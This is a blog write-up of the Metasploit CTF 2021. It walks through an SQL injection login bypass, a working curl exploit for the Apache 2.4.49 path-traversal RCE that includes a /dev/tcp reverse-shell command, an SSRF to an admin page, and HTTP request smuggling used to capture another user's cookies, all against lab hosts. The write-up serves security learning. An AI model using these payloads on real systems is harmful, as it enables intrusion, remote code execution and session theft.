+++
title = "Metasploit CTF 2021 WriteUp"
date = "2021-12-06"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["CTF"]
keywords = ["", ""]
description = ""
showFullContent = false
toc = true
images = ["/img/metasploitctf2021/metasploit-ascii.png"]
+++

{{< image src="/img/metasploitctf2021/metasploit-ascii.png" alt="" position="center" style="border-radius: 8px;" >}}

## Introduction

Similar to last year's ctf we are provided with a kali machine as the jump box and an Ubuntu VM with ports open for the different challenges.

As usual I participated with team @[fr334aks](https://twitter.com/fr334aks) and we were able to solve 8 challenges and got position 47/265. This year
most of the challenges were tougher than last year as we solved less. It was a good experience nonetheless. You can read last year's writeup [here](https://blog.ikuamike.io/posts/2020/metasploitctf2020/)
if interested.

In this writeup I'll be explaining solutions of 5 challenges I was able to solve. To connect to the victim machine directly via the kali box, I used this sshuttle command.

```sh
sshuttle -r kali@54.89.123.4 -e "ssh -i metasploit_ctf_kali_ssh_key.pem" 172.17.6.181/32
```

## Challenges

### 5 of Diamonds

This challenge was on port 11111. When we load it on our browser we get the below app.

{{< image src="/img/metasploitctf2021/metasploit-ctf-20.png" alt="" position="center" style="border-radius: 8px;" >}}

For this one it was a simple sql injection login bypass. By supplying the username `admin` and the password `a' or 1=1-- -`
we can login and get the flag.

{{< image src="/img/metasploitctf2021/metasploit-ctf-21.png" alt="" position="center" style="border-radius: 8px;" >}}

**Flag:**

{{< image src="/img/metasploitctf2021/5ofdiamonds.png" alt="" position="center" style="border-radius: 8px;" >}}

### 10 of Clubs

This challenge was on port 12380. From an nmap scan we get the below output.

{{< image src="/img/metasploitctf2021/metasploit-ctf-1.png" alt="" position="center" style="border-radius: 8px;" >}}

When we access the http server on the browser we just get a static page.

{{< image src="/img/metasploitctf2021/metasploit-ctf-2.png" alt="" position="center" style="border-radius: 8px;" >}}

The site didn't have anything interesting about it. Looking at the Apache httpd version it looked familiar as I had seen some
advisories floating around for this version regarding a directory traveral vulnerability that could lead to RCE.


Using the below PoC command I was able to confirm RCE.

```sh
curl --data "echo;id" 'http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

{{< image src="/img/metasploitctf2021/metasploit-ctf-3.png" alt="" position="center" style="border-radius: 8px;" >}}

Then with the below command we can get a reverse shell on the kali vm.

```sh
curl --data "echo;/bin/bash -c '/bin/bash -i >& /dev/tcp/172.17.6.180/53 0>&1'" 'http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```
{{< image src="/img/metasploitctf2021/metasploit-ctf-4.png" alt="" position="center" style="border-radius: 8px;" >}}

With the reverse shell we can get the md5sum of the image to submit as our flag.

{{< image src="/img/metasploitctf2021/metasploit-ctf-5.png" alt="" position="center" style="border-radius: 8px;" >}}

**Flag:**

{{< image src="/img/metasploitctf2021/10ofclubs.png" alt="" position="center" style="border-radius: 8px;" >}}

**Reference:**

`https://isc.sans.edu/forums/diary/Apache+2449+Directory+Traversal+Vulnerability+CVE202141773/27908/`

### 2 of Clubs

This challenge was on port 20000 and 20001. When we visit port 20000 on our browser, we get the following:

{{< image src="/img/metasploitctf2021/metasploit-ctf-6.png" alt="" position="center" style="border-radius: 8px;" >}}

The `/client` directory just has a file for us to download.

{{< image src="/img/metasploitctf2021/metasploit-ctf-7.png" alt="" position="center" style="border-radius: 8px;" >}}

After extraction we get some files and **clicktracer** application that launches a GUI application.

{{< image src="/img/metasploitctf2021/metasploit-ctf-8.png" alt="" position="center" style="border-radius: 8px;" >}}

Since it's connecting to localhost, I decided to use ssh port forwarding to forward the traffic to the victim.

```sh
ssh -L 20001:172.17.6.181:20001 -i metasploit_ctf_kali_ssh_key.pem kali@54.89.123.4
```
Selecting the easy challenge, it appears to be a clicking game where we are supposed to click the red dots.

{{< image src="/img/metasploitctf2021/metasploit-ctf-9.png" alt="" position="center" style="border-radius: 8px;" >}}

When the time hits 30 seconds, we get our final score.

{{< image src="/img/metasploitctf2021/metasploit-ctf-10.png" alt="" position="center" style="border-radius: 8px;" >}}

Next step is to use wireshark and sniff the traffic to figure out the messages between the application and the server so as to automate the clicks and 
get all of them.

{{< image src="/img/metasploitctf2021/metasploit-ctf-11.png" alt="" position="center" style="border-radius: 8px;" >}}

When we click on the Easy Practice button the messages are as follows.

{{< image src="/img/metasploitctf2021/metasploit-ctf-12.png" alt="" position="center" style="border-radius: 8px;" >}}

When we click on the Easy Challenge button the messages are as follows.

{{< image src="/img/metasploitctf2021/metasploit-ctf-13.png" alt="" position="center" style="border-radius: 8px;" >}}

With this information I was able to automate all clicks for the challenge using the below script and get the flag.

```py
#!/usr/bin/env python3
import json
from pwn import *
host = "127.0.0.1"
port = 20001
io = remote(host,port)
init = '{"StartGame":{"game_mode":"Easy"}}'
io.sendline(init.encode())

for i in range(100):
    resp = io.recv().decode().strip()
    if "TargetHit" in resp:
        print(resp)
        continue
    elif "GameEnded" in resp:
        print(resp)
        exit()
    print(resp)
    j = json.loads(resp)
    x = j["TargetCreated"]["x"]
    y = j["TargetCreated"]["y"]
    click = '{"ClientClick":{"x":'+ str(x) + ',"y":' + str(y) + '}}'
    io.sendline(click.encode())
```
When the script runs to completion we get the location of the flag.

{{< image src="/img/metasploitctf2021/metasploit-ctf-14.png" alt="" position="center" style="border-radius: 8px;" >}}

**Flag:**

{{< image src="/img/metasploitctf2021/2ofclubs.png" alt="" position="center" style="border-radius: 8px;" >}}

### Ace of Hearts
This challenge was on port 20011. When we load it on the browser we get this app.

{{< image src="/img/metasploitctf2021/metasploit-ctf-15.png" alt="" position="center" style="border-radius: 8px;" >}}

When we try to access each of the provided we can load them except for John which is restricted.

{{< image src="/img/metasploitctf2021/metasploit-ctf-16.png" alt="" position="center" style="border-radius: 8px;" >}}

The other interesting feature is the form. When I submit a test input the application tries to load it as url.

{{< image src="/img/metasploitctf2021/metasploit-ctf-17.png" alt="" position="center" style="border-radius: 8px;" >}}

Since we have an admin url that is also restricted, we can try to load it but specify the host as localhost as the below url.

```sh
http://172.17.6.181:20011/gallery?galleryUrl=http://127.0.0.1:20011/admin
```

{{< image src="/img/metasploitctf2021/metasploit-ctf-18.png" alt="" position="center" style="border-radius: 8px;" >}}

From this we can see that John's gallery is set to private. We can uncheck this and then access John's gallery.

{{< image src="/img/metasploitctf2021/metasploit-ctf-19.png" alt="" position="center" style="border-radius: 8px;" >}}

**Flag:**

{{< image src="/img/metasploitctf2021/aceofhearts.png" alt="" position="center" style="border-radius: 8px;" >}}

### 3 of Hearts

This challenge was on port 33337. From nmap we get the following output.

{{< image src="/img/metasploitctf2021/metasploit-ctf-22.png" alt="" position="center" style="border-radius: 8px;" >}}

When we try to load it on the browser it redirects to the domain threeofhearts.ctf.net. To sort this out I decided to add a match and replace
rule in burpsuite as below that sets the correct host header.

{{< image src="/img/metasploitctf2021/metasploit-ctf-23.png" alt="" position="center" style="border-radius: 8px;" >}}

Now we can access the application.

{{< image src="/img/metasploitctf2021/metasploit-ctf-24.png" alt="" position="center" style="border-radius: 8px;" >}}

The private page just shows access denied.

{{< image src="/img/metasploitctf2021/metasploit-ctf-25.png" alt="" position="center" style="border-radius: 8px;" >}}

The logs page is empty but once we submit anything on the form, for example `a,a` it gets saved to save.txt together with 2 headers.

{{< image src="/img/metasploitctf2021/metasploit-ctf-26.png" alt="" position="center" style="border-radius: 8px;" >}}

If we look at our burp history we see that the page responds with Nginx Save Page.

{{< image src="/img/metasploitctf2021/metasploit-ctf-28.png" alt="" position="center" style="border-radius: 8px;" >}}

This means that the backend server is Nginx and frontend is the ATS server.

After some research I discovered that Apache Traffic Server 7.1.1 is vulnerable to http request smuggling.

In this case the issue is CL.TE.

Explanation from https://portswigger.net/web-security/request-smuggling.

> CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. 

By sending the below request in burp, the ATS server uses Content-Length header and forwards the full request to the backend
nginx server which uses Transfer-Encoding header. 

Nginx will then split the request into 2 whereby it takes `G` as the beginning of the next request. The result of this is that 
any follow up requests will fail because the added `G` will create an HTTP method that doesn't exist. Say the follow up request is a GET
request the resulting method will be GGET.

{{< image src="/img/metasploitctf2021/metasploit-ctf-29.png" alt="" position="center" style="border-radius: 8px;" >}}

We can confirm this by sending the malformed request multiple times then try to access the site normally. We see that receive an
error from nginx which is as a result of the bad method.

{{< image src="/img/metasploitctf2021/metasploit-ctf-30.png" alt="" position="center" style="border-radius: 8px;" >}}

We can use this vulnerability to get access to the private page.

By sending the below request, we combine any follow up requests from any other users into the second request. The foo header will
combine the first line of the next request and that will be ignored as it is not a valid header and then any subsequent headers will be
processed by the backend and the cookie header logged to save.txt.

{{< image src="/img/metasploitctf2021/metasploit-ctf-31.png" alt="" position="center" style="border-radius: 8px;" >}}

After sending the request multiple times we get a new entry that was not from us in save.txt. We see cookies of another user who is accessing the private
page. 

{{< image src="/img/metasploitctf2021/metasploit-ctf-27.png" alt="" position="center" style="border-radius: 8px;" >}}

We can then use this cookies to load the private page and get the flag.

{{< image src="/img/metasploitctf2021/metasploit-ctf-32.png" alt="" position="center" style="border-radius: 8px;" >}}

**Flag:**

{{< image src="/img/metasploitctf2021/3ofhearts.png" alt="" position="center" style="border-radius: 8px;" >}}

**Reference:**

`https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/`

## Conclusion

Some great new challenges this year and definitely more challenging. Looking forward to next year's CTF. 

The last challenge definitely made me feel like I need to get back to Web Security Academy.

If you have any questions or feedback feel free to reach out
